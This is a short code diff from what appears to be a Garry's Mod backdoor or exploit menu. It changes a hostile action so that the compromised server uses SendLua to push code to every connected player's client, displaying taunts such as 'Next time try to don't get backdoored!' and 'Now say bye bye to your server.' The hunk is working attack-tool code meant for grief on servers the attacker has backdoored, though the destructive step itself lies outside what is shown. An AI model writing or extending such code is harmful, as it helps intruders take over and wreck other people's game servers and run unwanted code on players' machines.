@@ -95,11 +95,15 @@ lol:PushAction( 0, function( pPlayer )
 	]=]):format(lol.m_strImageLoadHTML) )
 
     timer.Create( "hello", 2, 1, function()
-    RunConsoleCommand( "say", "Next time try to don't get backdoored!" )
+    for k,v in pairs(player.GetAll()) do
+	v:SendLua("chat.AddText(Color(0, 115, 255), 'Next time try to don't get backdoored!')")
+    end
     end)
 
     timer.Create( "hello2", 6, 1, function()
-    RunConsoleCommand( "say", "Now say good bye to your Server" )
+    for k,v in pairs(player.GetAll()) do
+	v:SendLua("chat.AddText(Color(0, 115, 255), 'Now say bye bye to your server.')")
+    end
     end)
 
 end )
